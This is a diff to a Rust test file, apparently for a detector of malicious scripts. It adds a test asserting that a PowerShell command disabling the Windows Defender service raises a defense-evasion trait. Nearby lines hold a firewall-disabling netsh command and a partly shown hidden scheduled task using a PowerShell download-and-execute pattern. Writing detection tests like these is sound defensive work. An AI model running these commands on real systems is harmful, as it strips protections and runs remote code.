@@ -3576,6 +3576,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_chained_set_service_defender_disable_emits_evasion_trait() {
+        let script = br#"powershell -Command "Set-Service TermService -StartupType Automatic; Set-Service WinDefend -StartupType Disabled""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "powershell-service-disabled" && target == "WinDefend"
+            )),
+            "chained PowerShell Set-Service WinDefend disablement was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn netsh_legacy_firewall_mode_disable_emits_defender_evasion_trait() {
         let script = br#"netsh firewall set opmode mode=disable"#;
         let report = analyze(script, &AnalyzeConfig::default());
